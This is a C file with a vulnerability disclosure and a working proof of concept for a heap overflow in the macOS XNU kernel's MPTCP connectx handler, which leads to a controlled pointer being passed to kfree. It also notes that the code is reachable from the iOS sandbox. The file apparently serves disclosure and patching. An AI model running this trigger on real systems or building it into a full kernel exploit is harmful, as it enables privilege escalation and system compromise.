// ianbeer
#if 0
XNU kernel heap overflow due to bad bounds checking in MPTCP

mptcp_usr_connectx is the handler for the connectx syscall for the AP_MULTIPATH socket family.

The logic of this function fails to correctly handle source and destination sockaddrs which aren't
AF_INET or AF_INET6:

// verify sa_len for AF_INET:

	if (dst->sa_family == AF_INET &&
	    dst->sa_len != sizeof(mpte->__mpte_dst_v4)) {
		mptcplog((LOG_ERR, "%s IPv4 dst len %u\n", __func__,
			  dst->sa_len),
			 MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);
		error = EINVAL;
		goto out;
	}

// verify sa_len for AF_INET6:

	if (dst->sa_family == AF_INET6 &&
	    dst->sa_len != sizeof(mpte->__mpte_dst_v6)) {
		mptcplog((LOG_ERR, "%s IPv6 dst len %u\n", __func__,
			  dst->sa_len),
			 MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);
		error = EINVAL;
		goto out;
	}

// code doesn't bail if sa_family was neither AF_INET nor AF_INET6

	if (!(mpte->mpte_flags & MPTE_SVCTYPE_CHECKED)) {
		if (mptcp_entitlement_check(mp_so) < 0) {
			error = EPERM;
			goto out;
		}

		mpte->mpte_flags |= MPTE_SVCTYPE_CHECKED;
	}

// memcpy with sa_len up to 255:

	if ((mp_so->so_state & (SS_ISCONNECTED|SS_ISCONNECTING)) == 0) {
		memcpy(&mpte->mpte_dst, dst, dst->sa_len);
	}

This PoC triggers the issue to overwrite the mpte_itfinfo field leading to a controlled pointer
being passed to kfree when the socket is closed.

Please note that these lengths seem to be trusted in multiple places - I would strongly suggest auditing
this code quite thoroughly, especially as mptcp can be reached from more places as of iOS 11.

Note that the MPTCP code does seem to be quite buggy; trying to get a nice PoC working for this buffer overflow
bug I accidentally triggered the following error path:

	error = socreate_internal(dom, so, SOCK_STREAM, IPPROTO_TCP, p,
				  SOCF_ASYNC, PROC_NULL);
	mpte_lock(mpte);
	if (error) {
		mptcplog((LOG_ERR, "%s: subflow socreate mp_so 0x%llx unable to create subflow socket error %d\n",
			  (u_int64_t)VM_KERNEL_ADDRPERM(mp_so), error),
			 MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);

		proc_rele(p);

		mptcp_subflow_free(mpts);
		return (error);
	}

note that first argument to mptcplog has one too few arguments. It's probably not so interesting from a security
POV but is indicative of untested code (this error path has clearly never run as it will always kernel panic.) 

This PoC is for MacOS but note that this code is reachable on iOS 11 from inside the app sandbox if you give yourself
the multipath entitlement (which app store apps can now use.)

Just run this PoC as root on MacOS for easy repro.

Tested on MacOS 10.13.4 (17E199)
#endif


#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <unistd.h>

#define AF_MULTIPATH 39

int main() {
  int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
  if (sock < 0) {
    printf("socket failed\n");
    perror("");
    return 0;
  }
  printf("got socket: %d\n", sock);

  struct sockaddr* sockaddr_src = malloc(256);
  memset(sockaddr_src, 'A', 256);
  sockaddr_src->sa_len = 220;
  sockaddr_src->sa_family = 'B';
  
  struct sockaddr* sockaddr_dst = malloc(256);
  memset(sockaddr_dst, 'A', 256);
  sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
  sockaddr_dst->sa_family = AF_INET6;

  sa_endpoints_t eps = {0};
  eps.sae_srcif = 0;
  eps.sae_srcaddr = sockaddr_src;
  eps.sae_srcaddrlen = 220;
  eps.sae_dstaddr = sockaddr_dst;
  eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);

  int err = connectx(
    sock,
    &eps,
    SAE_ASSOCID_ANY,
    0,
    NULL,
    0,
    NULL,
    NULL);

  printf("err: %d\n", err);

  close(sock);

  return 0;
}
